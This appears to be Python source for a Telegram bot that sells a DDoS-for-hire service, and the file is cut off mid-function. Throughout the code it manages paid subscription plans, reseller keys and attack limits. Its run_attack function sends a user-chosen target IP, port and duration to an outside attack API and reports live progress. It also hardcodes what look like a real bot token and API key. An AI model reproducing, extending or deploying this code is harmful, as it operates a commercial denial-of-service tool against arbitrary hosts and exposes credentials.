#!/usr/bin/env python3
import time
import threading
import json
import os
import requests
import random
import string
from datetime import datetime
import io

# ============================================
# CONFIGURATION
# ============================================
TOKEN = "8941070109:AAEHz4IuI2Cc1sDoIffV2vJ6bwPLctl21wE"
ADMIN_IDS = [6548871396]

# ============================================
# API CONFIG
# ============================================
API_URL = "https://upd-api.onrender.com"
API_KEY = "TRX_9CA6EE86F3574F85"

# ============================================
# PLAN SETTINGS - Premium 2x Power
# ============================================
BASIC_PLAN = {
    "max_concurrent": 6,
    "max_time": 300,
    "cooldown": 60,
    "daily_limit": 50,
    "threads": 500
}

PREMIUM_PLAN = {
    "max_concurrent": 12,      # 2x Basic
    "max_time": 600,           # 2x Basic
    "cooldown": 0,             # No Cooldown
    "daily_limit": 100,        # 2x Basic
    "threads": 1000            # 2x Basic
}

RESELLER_PLAN = {
    "max_concurrent": 12,
    "max_time": 600,
    "cooldown": 0,
    "daily_limit": 100,
    "threads": 1000
}

ADMIN_PLAN = {
    "max_concurrent": 999,
    "max_time": 9999,
    "cooldown": 0,
    "daily_limit": 99999,
    "threads": 9999
}

# ============================================
# RESELLER KEY PRICES
# ============================================
RESELLER_KEY_PRICES = {
    "1h": {"price": 1, "type": "basic"},
    "5h": {"price": 3, "type": "basic"},
    "1d": {"price": 4, "type": "basic"},
    "3d": {"price": 8, "type": "basic"},
    "7d": {"price": 15, "type": "basic"},
    "14d": {"price": 25, "type": "basic"},
    "30d": {"price": 50, "type": "basic"},
    "60d": {"price": 80, "type": "basic"},
    "VIP_1d": {"price": 6, "type": "premium"},
    "VIP_3d": {"price": 12, "type": "premium"},
    "VIP_7d": {"price": 20, "type": "premium"},
    "VIP_14d": {"price": 35, "type": "premium"},
    "VIP_30d": {"price": 60, "type": "premium"},
    "VIP_60d": {"price": 100, "type": "premium"},
}

# ============================================
# STORAGE
# ============================================
users = {}
groups = {}
keys = {}
resellers = {}
blocked_keys = {}
active_attacks = {}
user_cooldown = {}
user_daily_count = {}
temp_data = {}
status_update_threads = {}
user_key_map = {}

MAX_CONCURRENT = 6
MAX_TIME = 300
COOLDOWN_SECONDS = 60
DAILY_LIMIT = 50
attack_threads = 500
is_locked = False
is_maintenance = False
is_bot_off = False
last_update_id = 0
VIDEO_FILE_ID = None
cmd_cooldown = {}

attack_lock = threading.Lock()

# ============================================
# JSON BACKUP & RESTORE FUNCTIONS
# ============================================

def get_users_json_clean():
    filtered_users = {}
    filtered_key_map = {}
    
    for uid, expiry in users.items():
        uid_int = int(uid)
        if uid_int not in ADMIN_IDS:
            filtered_users[uid] = expiry
    
    for uid, key in user_key_map.items():
        uid_int = int(uid)
        if uid_int not in ADMIN_IDS:
            filtered_key_map[uid] = key
    
    data = {
        "export_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "total_users": len(filtered_users),
        "users": filtered_users,
        "user_key_map": filtered_key_map
    }
    return json.dumps(data, indent=2)

def get_resellers_json_clean():
    filtered_resellers = {}
    
    for rid, info in resellers.items():
        rid_int = int(rid)
        if rid_int not in ADMIN_IDS:
            filtered_resellers[rid] = info
    
    data = {
        "export_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "total_resellers": len(filtered_resellers),
        "resellers": filtered_resellers
    }
    return json.dumps(data, indent=2)

def get_keys_json_clean():
    data = {
        "export_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "total_keys": len(keys),
        "keys": keys
    }
    return json.dumps(data, indent=2)

def restore_users_from_json(json_content):
    try:
        data = json.loads(json_content)
        if 'users' in data:
            global users, user_key_map
            restored_count = 0
            for uid, expiry in data['users'].items():
                uid_int = int(uid)
                if uid_int not in ADMIN_IDS:
                    users[uid] = expiry
                    restored_count += 1
            if 'user_key_map' in data:
                for uid, key in data['user_key_map'].items():
                    uid_int = int(uid)
                    if uid_int not in ADMIN_IDS:
                        user_key_map[uid] = key
            save_data()
            return True, f"✅ Restored {restored_count} users!"
        return False, "❌ Invalid users JSON format!"
    except Exception as e:
        return False, f"❌ Error: {str(e)}"

def restore_resellers_from_json(json_content):
    try:
        data = json.loads(json_content)
        if 'resellers' in data:
            global resellers
            restored_count = 0
            for rid, info in data['resellers'].items():
                rid_int = int(rid)
                if rid_int not in ADMIN_IDS:
                    resellers[rid] = info
                    restored_count += 1
            save_data()
            return True, f"✅ Restored {restored_count} resellers!"
        return False, "❌ Invalid resellers JSON format!"
    except Exception as e:
        return False, f"❌ Error: {str(e)}"

def restore_keys_from_json(json_content):
    try:
        data = json.loads(json_content)
        if 'keys' in data:
            global keys
            for key, key_data in data['keys'].items():
                keys[key] = key_data
            save_data()
            return True, f"✅ Restored {len(data['keys'])} keys!"
        return False, "❌ Invalid keys JSON format!"
    except Exception as e:
        return False, f"❌ Error: {str(e)}"

# ============================================
# PLAN FUNCTIONS
# ============================================

def get_user_plan(user_id):
    user_id_str = str(user_id)
    
    if is_admin(user_id):
        return "admin"
    
    if is_reseller(user_id):
        return "reseller"
    
    if user_id_str in user_key_map:
        key = user_key_map[user_id_str]
        if key in keys and keys[key].get('type') == 'premium':
            return "premium"
    
    return "basic"

def get_user_limits(user_id):
    plan = get_user_plan(user_id)
    
    if plan == "admin":
        return ADMIN_PLAN
    elif plan == "reseller":
        return RESELLER_PLAN
    elif plan == "premium":
        return PREMIUM_PLAN
    else:
        return BASIC_PLAN

def get_plan_name(user_id):
    plan = get_user_plan(user_id)
    if plan == "admin":
        return "👑 ADMIN"
    elif plan == "reseller":
        return "💼 RESELLER"
    elif plan == "premium":
        return "🌟 PREMIUM 💎"
    else:
        return "📀 BASIC ⚡"

def get_plan_details(user_id):
    limits = get_user_limits(user_id)
    plan_name = get_plan_name(user_id)
    
    return f"""
━━━━━━━━━━━━━━━━━━━━━━━━
📋 **YOUR PLAN DETAILS**
━━━━━━━━━━━━━━━━━━━━━━━━
🌟 Plan: {plan_name}
━━━━━━━━━━━━━━━━━━━━━━━━
⚙️ **Limits:**
├ 🎯 Max Concurrent: {limits['max_concurrent']}
├ ⏱️ Max Time: {limits['max_time']}s
├ ⏳ Cooldown: {limits['cooldown']}s
├ 📊 Daily Limit: {limits['daily_limit']}
└ 🧵 Threads: {limits['threads']}
━━━━━━━━━━━━━━━━━━━━━━━━"""

# ============================================
# HELPER FUNCTIONS
# ============================================
def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_reseller(uid):
    return str(uid) in resellers

def is_user(uid):
    if is_admin(uid):
        return True
    if is_reseller(uid):
        return True
    uid_str = str(uid)
    if uid_str in users and time.time() < users[uid_str]:
        if uid_str in user_key_map:
            key = user_key_map[uid_str]
            if key in keys and keys[key].get('blocked', False):
                return False
            if is_key_blocked(key):
                return False
        return True
    return False

def is_user_valid(user_id):
    user_id_str = str(user_id)
    
    if is_admin(user_id):
        return True, ""
    
    if is_reseller(user_id):
        return True, ""
    
    if user_id_str not in users:
        return False, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ NO ACTIVE SUBSCRIPTION!
━━━━━━━━━━━━━━━━━━━━━━━━
You don't have an active plan.
Use /redeem KEY to get access.
━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    if time.time() >= users[user_id_str]:
        return False, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ SUBSCRIPTION EXPIRED!
━━━━━━━━━━━━━━━━━━━━━━━━
Your plan has expired.
Please redeem a new key.
━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    if user_id_str in user_key_map:
        redeemed_key = user_key_map[user_id_str]
        if is_key_blocked(redeemed_key):
            return False, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ KEY BLOCKED BY ADMIN!
━━━━━━━━━━━━━━━━━━━━━━━━
The key you used has been blocked.
Contact support for assistance.
━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    return True, ""

def get_progress_bar(percent):
    filled = int(percent / 5)
    empty = 20 - filled
    return "█" * filled + "▒" * empty

def get_status_text(chat_id, user_id):
    current = len(active_attacks)
    limits = get_user_limits(user_id)
    plan_name = get_plan_name(user_id)
    
    if current == 0:
        return f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ ACTIVE ATTACKS: 0/{limits['max_concurrent']}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🌟 Plan: {plan_name}

⚙️ SETTINGS:
┣ 🎯 Max Concurrent: {limits['max_concurrent']}
┣ ⏱️ Max Time: {limits['max_time']}s
┣ ⏳ Cooldown: {limits['cooldown']}s
┗ 🧵 Threads: {limits['threads']}

⏳ Your Cooldown: {get_user_cooldown_status(user_id)}

🔄 Auto-updates every second!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    attacks_list = ""
    for aid, attack in list(active_attacks.items())[:5]:
        bar = get_progress_bar(attack['percent'])
        if is_admin(attack['user_id']):
            user_type = "👑 Admin"
        elif is_reseller(attack['user_id']):
            user_type = "💼 Reseller"
        else:
            user_type = "👤 User"
        attacks_list += f"🎯 {attack['ip']}:{attack['port']}\n   ⏱️ {attack['remaining']}s remaining\n   `{bar}` {attack['percent']}%\n   👤 {user_type}\n\n"
    
    if len(active_attacks) > 5:
        attacks_list += f"\n... and {len(active_attacks) - 5} more attacks"
    
    return f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ ACTIVE ATTACKS: {current}/{limits['max_concurrent']}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{attacks_list}
🌟 Plan: {plan_name}

⚙️ SETTINGS:
┣ 🎯 Max Concurrent: {limits['max_concurrent']}
┣ ⏱️ Max Time: {limits['max_time']}s
┣ ⏳ Cooldown: {limits['cooldown']}s
┗ 🧵 Threads: {limits['threads']}

⏳ Your Cooldown: {get_user_cooldown_status(user_id)}

🔄 Auto-updates every second!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

def update_status_message(chat_id, message_id, user_id):
    while True:
        try:
            if is_bot_off:
                time.sleep(5)
                continue
            text = get_status_text(chat_id, user_id)
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/editMessageText",
                json={
                    "chat_id": chat_id,
                    "message_id": message_id,
                    "text": text,
                    "parse_mode": "Markdown"
                },
                timeout=5
            )
            time.sleep(1)
        except:
            time.sleep(1)

def send_status(chat_id, user_id):
    if is_bot_off:
        return False
    
    text = get_status_text(chat_id, user_id)
    
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"},
            timeout=10
        ).json()
        
        if response.get('ok'):
            message_id = response['result']['message_id']
            update_thread = threading.Thread(
                target=update_status_message,
                args=(chat_id, message_id, user_id),
                daemon=True
            )
            update_thread.start()
            status_update_threads[f"{chat_id}_{message_id}"] = update_thread
            return True
    except:
        pass
    return False

# ============================================
# TELEGRAM FUNCTIONS
# ============================================
def send_msg(chat_id, text, parse_mode=None):
    try:
        payload = {"chat_id": chat_id, "text": text}
        if parse_mode:
            payload["parse_mode"] = parse_mode
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json=payload, timeout=5)
    except:
        pass

def send_video(chat_id, video_id, caption):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendVideo", json={"chat_id": chat_id, "video": video_id, "caption": caption}, timeout=10)
    except:
        pass

def send_buttons(chat_id, text, buttons):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": text,
                "parse_mode": "Markdown",
                "reply_markup": {"inline_keyboard": buttons}
            },
            timeout=5
        )
    except:
        pass

def del_msg(chat_id, msg_id):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/deleteMessage", json={"chat_id": chat_id, "message_id": msg_id}, timeout=5)
    except:
        pass

def send_document(chat_id, file_content, filename):
    try:
        files = {'document': (filename, io.BytesIO(file_content.encode()), 'application/json')}
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument", data={'chat_id': chat_id}, files=files, timeout=30)
        return True
    except Exception as e:
        print(f"Send document error: {e}")
        return False

def answer_callback(callback_id, text=None):
    try:
        payload = {"callback_query_id": callback_id}
        if text:
            payload["text"] = text
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery",
            json=payload,
            timeout=3
        )
    except:
        pass

def edit_message_text(chat_id, message_id, text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/editMessageText",
            json={"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "Markdown"},
            timeout=5
        )
    except:
        pass

# ============================================
# VIDEO HANDLER
# ============================================
def handle_video(chat_id, user_id, video_id):
    global VIDEO_FILE_ID
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    VIDEO_FILE_ID = video_id
    save_data()
    send_msg(chat_id, "✅ Attack video saved successfully!")

def remove_video(chat_id, user_id):
    global VIDEO_FILE_ID
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    VIDEO_FILE_ID = None
    save_data()
    send_msg(chat_id, "✅ Attack video removed!")

# ============================================
# ATTACK FUNCTION
# ============================================
def run_attack(attack_id, chat_id, ip, port, duration, user_id, username):
    try:
        caption = f"""
━━━━━━━━━━━━━━━━━━━━━━━━
⚡ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!
━━━━━━━━━━━━━━━━━━━━━━━━
🎯 𝐓𝐚𝐫𝐠𝐞𝐭: {ip}:{port}
⏱️ 𝐓𝐢𝐦𝐞: {duration}s
📡 𝐔𝐬𝐢𝐧𝐠: 𝐀𝐏𝐈 𝐀𝐭𝐭𝐚𝐜𝐤
━━━━━━━━━━━━━━━━━━━━━━━━
📊 Type /status to see live progress!
━━━━━━━━━━━━━━━━━━━━━━━━"""
        if VIDEO_FILE_ID:
            send_video(chat_id, VIDEO_FILE_ID, caption)
        else:
            send_msg(chat_id, caption)
        
        try:
            requests.post(f"{API_URL}/api/attack", json={"key": API_KEY, "ip": ip, "port": port, "time": duration}, timeout=3)
        except:
            pass
        
        for elapsed in range(duration + 1):
            with attack_lock:
                if attack_id in active_attacks:
                    remaining = duration - elapsed
                    percent = int((elapsed / duration) * 100) if duration > 0 else 100
                    active_attacks[attack_id]['remaining'] = remaining
                    active_attacks[attack_id]['percent'] = percent
            time.sleep(1)
        
        with attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
        
        send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄!
━━━━━━━━━━━━━━━━━━━━━━━━
🎯 Target: {ip}:{port}
⏱️ Duration: {duration}s
📡 Using: API Attack
━━━━━━━━━━━━━━━━━━━━━━━━""")
        time.sleep(2)
        
    except Exception as e:
        print(f"Attack error: {e}")
        with attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]

# ============================================
# FILE HANDLING
# ============================================
def save_data():
    data_to_save = {
        'users': users,
        'groups': groups,
        'keys': keys,
        'resellers': resellers,
        'blocked_keys': blocked_keys,
        'max_concurrent': MAX_CONCURRENT,
        'max_time': MAX_TIME,
        'cooldown': COOLDOWN_SECONDS,
        'daily_limit': DAILY_LIMIT,
        'attack_threads': attack_threads,
        'is_locked': is_locked,
        'is_maintenance': is_maintenance,
        'is_bot_off': is_bot_off,
        'video_file_id': VIDEO_FILE_ID,
        'admin_ids': ADMIN_IDS,
        'user_key_map': user_key_map,
        'last_id': last_update_id,
    }
    
    with open('data.json', 'w') as f:
        json.dump(data_to_save, f)

def load_data():
    global users, groups, keys, resellers, blocked_keys, MAX_CONCURRENT, MAX_TIME, COOLDOWN_SECONDS, DAILY_LIMIT
    global attack_threads, is_locked, is_maintenance, is_bot_off, VIDEO_FILE_ID, ADMIN_IDS, user_key_map, last_update_id
    
    try:
        with open('data.json', 'r') as f:
            d = json.load(f)
            users = d.get('users', {})
            groups = d.get('groups', {})
            keys = d.get('keys', {})
            resellers = d.get('resellers', {})
            blocked_keys = d.get('blocked_keys', {})
            MAX_CONCURRENT = d.get('max_concurrent', 6)
            MAX_TIME = d.get('max_time', 300)
            COOLDOWN_SECONDS = d.get('cooldown', 60)
            DAILY_LIMIT = d.get('daily_limit', 50)
            attack_threads = d.get('attack_threads', 500)
            is_locked = d.get('is_locked', False)
            is_maintenance = d.get('is_maintenance', False)
            is_bot_off = d.get('is_bot_off', False)
            VIDEO_FILE_ID = d.get('video_file_id', None)
            saved_admins = d.get('admin_ids', [])
            if saved_admins:
                ADMIN_IDS = saved_admins
            user_key_map = d.get('user_key_map', {})
            last_update_id = d.get('last_id', 0)
    except:
        pass

# ============================================
# GROUP FUNCTIONS
# ============================================
def is_group_allowed(group_id):
    return str(group_id) in groups and time.time() < groups[str(group_id)]

def add_group(group_id, days):
    groups[str(group_id)] = time.time() + (days * 86400)
    save_data()

def remove_group(group_id):
    if str(group_id) in groups:
        del groups[str(group_id)]
        save_data()

# ============================================
# USER FUNCTIONS
# ============================================
def add_user(uid, days=0, hours=0):
    current_time = time.time()
    expiry_seconds = (days * 86400) + (hours * 3600)
    users[str(uid)] = current_time + expiry_seconds
    save_data()

def remove_user(uid):
    uid_str = str(uid)
    if uid_str in users:
        del users[uid_str]
    if uid_str in user_key_map:
        del user_key_map[uid_str]
    save_data()

def expire_user_by_key(key):
    if key in keys:
        used_by = keys[key].get('used_by')
        if used_by and used_by in users:
            users[used_by] = time.time() - 1
        if used_by and used_by in user_key_map:
            del user_key_map[used_by]

def get_user_expiry(uid):
    if is_admin(uid):
        return "Admin (Lifetime)"
    uid_str = str(uid)
    if uid_str in users:
        r = users[uid_str] - time.time()
        if r <= 0:
            return "Expired"
        days = int(r // 86400)
        hours = int((r % 86400) // 3600)
        minutes = int((r % 3600) // 60)
        
        if days > 0:
            if hours > 0:
                return f"{days}d {hours}h"
            else:
                return f"{days}d"
        elif hours > 0:
            if minutes > 0:
                return f"{hours}h {minutes}m"
            else:
                return f"{hours}h"
        else:
            return f"{minutes}m"
    return None

def get_user_expiry_date(user_id):
    if is_admin(user_id) or is_reseller(user_id):
        return "NEVER"
    
    user_id_str = str(user_id)
    if user_id_str not in users:
        return None
    
    expiry_timestamp = users[user_id_str]
    if expiry_timestamp <= time.time():
        return None
    
    return datetime.fromtimestamp(expiry_timestamp).strftime("%Y-%m-%d %H:%M:%S")

def get_user_remaining_time(user_id):
    if is_admin(user_id) or is_reseller(user_id):
        return "LIFETIME"
    
    user_id_str = str(user_id)
    if user_id_str not in users:
        return None
    
    remaining = users[user_id_str] - time.time()
    if remaining <= 0:
        return None
    
    days = int(remaining // 86400)
    hours = int((remaining % 86400) // 3600)
    minutes = int((remaining % 3600) // 60)
    
    if days > 0:
        if hours > 0:
            return f"{days}d {hours}h {minutes}m"
        else:
            return f"{days}d {minutes}m"
    elif hours > 0:
        if minutes > 0:
            return f"{hours}h {minutes}m"
        else:
            return f"{hours}h"
    else:
        return f"{minutes}m"

def get_today_attack_count(user_id):
    today = datetime.now().strftime("%Y-%m-%d")
    key = f"{user_id}_{today}"
    return user_daily_count.get(key, 0)

# ============================================
# RESELLER FUNCTIONS
# ============================================
def add_reseller(uid, tokens, is_unlimited=False):
    resellers[str(uid)] = {'tokens': tokens if not is_unlimited else -1, 'total_earned': 0, 'keys_generated': [], 'blocked_keys': [], 'unlimited': is_unlimited}
    save_data()

def remove_reseller(uid):
    if str(uid) in resellers:
        for k in resellers[str(uid)]['keys_generated']:
            if k in keys:
                del keys[k]
        del resellers[str(uid)]
        save_data()

def get_reseller_tokens(uid):
    if str(uid) in resellers:
        return "∞" if resellers[str(uid)].get('unlimited') else resellers[str(uid)]['tokens']
    return 0

def deduct_reseller_tokens(uid, amount):
    if str(uid) in resellers:
        if resellers[str(uid)].get('unlimited'):
            return True
        if resellers[str(uid)]['tokens'] >= amount:
            resellers[str(uid)]['tokens'] -= amount
            resellers[str(uid)]['total_earned'] += amount
            save_data()
            return True
    return False

def add_reseller_key(uid, key):
    if str(uid) in resellers:
        resellers[str(uid)]['keys_generated'].append(key)
        save_data()

def get_reseller_keys(uid):
    return resellers[str(uid)]['keys_generated'] if str(uid) in resellers else []

def remove_reseller_key(uid, key):
    if str(uid) in resellers and key in resellers[str(uid)]['keys_generated']:
        resellers[str(uid)]['keys_generated'].remove(key)
        save_data()

def add_blocked_key(uid, key):
    if str(uid) in resellers:
        resellers[str(uid)]['blocked_keys'].append(key)
    blocked_keys[key] = True
    if key in keys:
        keys[key]['blocked'] = True
    expire_user_by_key(key)
    save_data()

def remove_blocked_key(key):
    if key in blocked_keys:
        del blocked_keys[key]
        if key in keys:
            keys[key]['blocked'] = False
        save_data()
        return True
    return False

def is_key_blocked(key):
    return key in blocked_keys or (key in keys and keys[key].get('blocked', False))

def get_reseller_blocked_keys(uid):
    return resellers[str(uid)]['blocked_keys'] if str(uid) in resellers else []

# ============================================
# KEY FUNCTIONS
# ============================================
def parse_duration(duration_str):
    duration_str = str(duration_str).lower().strip()
    import re
    
    match = re.match(r'^(\d+(?:\.\d+)?)([dh])$', duration_str)
    
    if match:
        value = float(match.group(1))
        unit = match.group(2)
        if unit == 'h':
            return 'hours', value
        elif unit == 'd':
            return 'days', value
    else:
        match = re.match(r'^(\d+(?:\.\d+)?)$', duration_str)
        if match:
            value = float(match.group(1))
            return 'days', value
    
    return None, None

def generate_basic_admin_key(prefix, duration_str):
    unit, value = parse_duration(duration_str)
    
    if unit is None:
        return None, "❌ Invalid duration! Use like: 30, 30d, 12h, 1.5h, 2.5d, 0.5d"
    
    if value <= 0:
        return None, "❌ Duration must be greater than 0!"
    
    if unit == 'days' and value > 3650:
        return None, "❌ Maximum duration is 3650 days!"
    
    if unit == 'hours' and value > 87600:
        return None, "❌ Maximum duration is 87600 hours!"
    
    key = f"{prefix}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
    
    if unit == 'days':
        keys[key] = {'days': float(value), 'hours': 0, 'used': False, 'used_by': None, 'created_by': 'admin', 'blocked': False, 'type': 'basic'}
    else:
        keys[key] = {'days': 0, 'hours': float(value), 'used': False, 'used_by': None, 'created_by': 'admin', 'blocked': False, 'type': 'basic'}
    
    save_data()
    return key, None

def generate_premium_admin_key(prefix, duration_str):
    unit, value = parse_duration(duration_str)
    
    if unit is None:
        return None, "❌ Invalid duration! Use like: 30, 30d, 12h, 1.5h, 2.5d, 0.5d"
    
    if value <= 0:
        return None, "❌ Duration must be greater than 0!"
    
    if unit == 'days' and value > 3650:
        return None, "❌ Maximum duration is 3650 days!"
    
    if unit == 'hours' and value > 87600:
        return None, "❌ Maximum duration is 87600 hours!"
    
    key = f"VIP-{prefix}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
    
    if unit == 'days':
        keys[key] = {'days': float(value), 'hours': 0, 'used': False, 'used_by': None, 'created_by': 'admin', 'blocked': False, 'type': 'premium'}
    else:
        keys[key] = {'days': 0, 'hours': float(value), 'used': False, 'used_by': None, 'created_by': 'admin', 'blocked': False, 'type': 'premium'}
    
    save_data()
    return key, None

def generate_reseller_key(reseller_id, key_type, duration_str):
    """Generate reseller key with specified type (basic/premium)"""
    key_info = RESELLER_KEY_PRICES.get(duration_str)
    if not key_info:
        return None, "❌ INVALID DURATION!"
    
    price = key_info['price']
    if not deduct_reseller_tokens(reseller_id, price):
        return None, f"❌ INSUFFICIENT TOKENS!\nNeed {price} tokens"
    
    # Generate key based on type
    if key_type == "premium":
        prefix = "VIP"
        plan_type = "premium"
        plan_name = "🌟 PREMIUM 💎"
    else:
        prefix = "TRX"
        plan_type = "basic"
        plan_name = "📀 BASIC ⚡"
    
    key = f"{prefix}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
    days, hours = 0, 0
    
    # Parse duration
    dur_str = duration_str.replace("VIP_", "").replace("_", "")
    if dur_str.endswith('h'):
        hours = int(dur_str.replace('h', ''))
    elif dur_str.endswith('d'):
        days = int(dur_str.replace('d', ''))
    
    keys[key] = {
        'days': days, 
        'hours': hours, 
        'used': False, 
        'used_by': None, 
        'created_by': str(reseller_id), 
        'blocked': False, 
        'type': plan_type
    }
    add_reseller_key(reseller_id, key)
    save_data()
    
    # Format duration text
    if days > 0:
        dur_text = f"{days} Days"
    else:
        dur_text = f"{hours} Hours"
    
    return key, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
✅ KEY GENERATED SUCCESSFULLY!
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 Key: `{key}`
📅 Duration: {dur_text}
🌟 Type: {plan_name}
━━━━━━━━━━━━━━━━━━━━━━━━
💰 Tokens Used: {price}
📊 Balance: {get_reseller_tokens(reseller_id)}
━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ Save this key! This key will not be shown again.
━━━━━━━━━━━━━━━━━━━━━━━━"""

def redeem_key(user_id, key):
    user_id_str = str(user_id)
    
    if key not in keys:
        return False, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ INVALID KEY!
━━━━━━━━━━━━━━━━━━━━━━━━
The key you entered does not exist.
━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    if keys[key]['used']:
        return False, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ KEY ALREADY USED!
━━━━━━━━━━━━━━━━━━━━━━━━
This key has already been redeemed.
━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    if keys[key].get('blocked', False) or is_key_blocked(key):
        return False, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ KEY IS BLOCKED!
━━━━━━━━━━━━━━━━━━━━━━━━
This key has been blocked by admin.
━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    days = float(keys[key]['days'])
    hours = float(keys[key].get('hours', 0))
    key_type = keys[key].get('type', 'basic')
    keys[key]['used'] = True
    keys[key]['used_by'] = str(user_id)
    user_key_map[user_id_str] = key
    add_user(user_id, days, hours)
    save_data()
    
    expiry_timestamp = users[user_id_str]
    expiry_date = datetime.fromtimestamp(expiry_timestamp).strftime("%Y-%m-%d %H:%M:%S")
    
    if days > 0:
        duration_text = f"{int(days)} Days" if days % 1 == 0 else f"{days} Days"
    elif hours > 0:
        duration_text = f"{int(hours)} Hours" if hours % 1 == 0 else f"{hours} Hours"
    else:
        duration_text = "Unknown"
    
    plan_name = "🌟 PREMIUM 💎" if key_type == 'premium' else "📀 BASIC ⚡"
    
    return True, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
✅ KEY REDEEMED SUCCESSFULLY!
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 Key: `{key}`
📅 Duration: {duration_text}
🌟 Plan: {plan_name}
📅 Expiry: {expiry_date}
━━━━━━━━━━━━━━━━━━━━━━━━
Use /start to use this bot.
━━━━━━━━━━━━━━━━━━━━━━━━"""

def delete_key(key, user_id):
    if key not in keys:
        return False, "❌ KEY NOT FOUND!"
    creator = keys[key].get('created_by')
    if not is_admin(user_id) and creator != str(user_id):
        return False, "❌ ACCESS DENIED!"
    
    expire_user_by_key(key)
    
    if creator != 'admin':
        remove_reseller_key(int(creator), key)
    del keys[key]
    save_data()
    return True, f"✅ KEY DELETED!\nKey: {key}"

def block_key(key, user_id):
    if key not in keys:
        return False, "❌ KEY NOT FOUND!"
    creator = keys[key].get('created_by')
    if not is_admin(user_id) and creator != str(user_id):
        return False, "❌ ACCESS DENIED!"
    if keys[key].get('blocked', False):
        return False, "❌ KEY ALREADY BLOCKED!"
    
    keys[key]['blocked'] = True
    expire_user_by_key(key)
    
    if creator != 'admin':
        add_blocked_key(int(creator), key)
    save_data()
    return True, f"✅ KEY BLOCKED!\nKey: {key}"

def unblock_key(key, user_id):
    if key not in keys:
        return False, "❌ KEY NOT FOUND!"
    creator = keys[key].get('created_by')
    if not is_admin(user_id) and creator != str(user_id):
        return False, "❌ ACCESS DENIED!"
    if not keys[key].get('blocked', False):
        return False, "❌ KEY IS NOT BLOCKED!"
    
    keys[key]['blocked'] = False
    
    used_by = keys[key].get('used_by')
    if used_by:
        days = float(keys[key]['days'])
        hours = float(keys[key].get('hours', 0))
        current_time = time.time()
        expiry_seconds = (days * 86400) + (hours * 3600)
        users[used_by] = current_time + expiry_seconds
        user_key_map[used_by] = key
    
    if creator != 'admin':
        if key in blocked_keys:
            del blocked_keys[key]
        if key in resellers.get(int(creator), {}).get('blocked_keys', []):
            resellers[int(creator)]['blocked_keys'].remove(key)
    save_data()
    return True, f"✅ KEY UNBLOCKED!\nKey: {key}"

def my_blocked_keys(user_id):
    if is_admin(user_id):
        return [k for k, v in keys.items() if v.get('blocked', False)]
    return get_reseller_blocked_keys(user_id)

# ============================================
# COOLDOWN FUNCTIONS
# ============================================
def can_attack(user_id):
    limits = get_user_limits(user_id)
    today = datetime.now().strftime("%Y-%m-%d")
    key = f"{user_id}_{today}"
    
    if key not in user_daily_count:
        user_daily_count[key] = 0
    if user_daily_count[key] >= limits['daily_limit'] and not is_admin(user_id):
        return False, f"❌ DAILY LIMIT REACHED!\nMax {limits['daily_limit']} attacks per day"
    
    if not is_admin(user_id):
        if user_id in user_cooldown:
            remaining = limits['cooldown'] - (time.time() - user_cooldown[user_id])
            if remaining > 0:
                return False, f"⏳ COOLDOWN ACTIVE!\nWait {int(remaining)}s"
    return True, "OK"

def add_attack_count(user_id):
    if is_admin(user_id):
        return
    today = datetime.now().strftime("%Y-%m-%d")
    key = f"{user_id}_{today}"
    user_daily_count[key] = user_daily_count.get(key, 0) + 1
    user_cooldown[user_id] = time.time()

def get_user_cooldown_status(user_id):
    limits = get_user_limits(user_id)
    if is_admin(user_id):
        return "✅ Ready (No cooldown)"
    if user_id in user_cooldown:
        remaining = limits['cooldown'] - (time.time() - user_cooldown[user_id])
        if remaining > 0:
